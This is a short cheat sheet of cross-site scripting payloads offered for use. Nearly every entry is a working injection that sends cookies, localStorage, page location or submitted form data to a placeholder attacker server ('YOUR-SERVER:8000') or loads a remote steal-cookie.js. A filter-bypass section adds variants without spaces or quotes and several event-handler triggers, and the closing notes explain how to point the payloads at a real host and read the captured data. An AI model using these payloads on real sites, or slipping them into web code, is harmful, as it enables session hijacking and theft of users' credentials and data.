# XSS Payload Examples

## Basic Cookie Stealing

### IMG tag with onerror
<img src=x onerror="fetch('http://YOUR-SERVER:8000/xss?c='+btoa(document.cookie))">

### Script tag
<script>fetch('http://YOUR-SERVER:8000/xss?c='+btoa(document.cookie))</script>

### IMG tag - shorter version
<img src=x onerror="fetch('//YOUR-SERVER:8000/xss?c='+document.cookie)">

### With location info
<img src=x onerror="fetch('http://YOUR-SERVER:8000/xss?c='+btoa(document.cookie)+'&u='+btoa(location))">

## Load External Payload

### Script inclusion
<script src="http://YOUR-SERVER:8000/xss/steal-cookie.js"></script>

### Using jQuery (if available)
<script>$.getScript('http://YOUR-SERVER:8000/xss/steal-cookie.js')</script>

## Data Exfiltration

### Steal localStorage
<script>fetch('http://YOUR-SERVER:8000/xss',{method:'POST',body:JSON.stringify({cookies:document.cookie,storage:localStorage})})</script>

### Steal form data
<script>
document.forms[0].addEventListener('submit',function(e){
  fetch('http://YOUR-SERVER:8000/xss',{method:'POST',body:new FormData(e.target)})
})
</script>

## Blind XSS Confirmation

### Simple callback
<img src="http://YOUR-SERVER:8000/blind/xss-confirmed">

### With identifier
<img src="http://YOUR-SERVER:8000/blind?page=profile&user=admin">

## Common Bypasses

### No spaces
<img/src=x/onerror=fetch('//YOUR-SERVER:8000/xss?c='+document.cookie)>

### No quotes
<img src=x onerror=fetch(`//YOUR-SERVER:8000/xss?c=`+document.cookie)>

### Event handlers
<body onload="fetch('http://YOUR-SERVER:8000/xss?c='+document.cookie)">
<input onfocus="fetch('http://YOUR-SERVER:8000/xss?c='+document.cookie)" autofocus>
<svg onload="fetch('http://YOUR-SERVER:8000/xss?c='+document.cookie)">

## Notes

- Replace YOUR-SERVER with your actual IP/hostname
- Use btoa() for base64 encoding to avoid issues with special characters
- The server at port 8000 logs everything to logs/server.ndjson
- Check logs with: tail -f logs/server.ndjson | jq .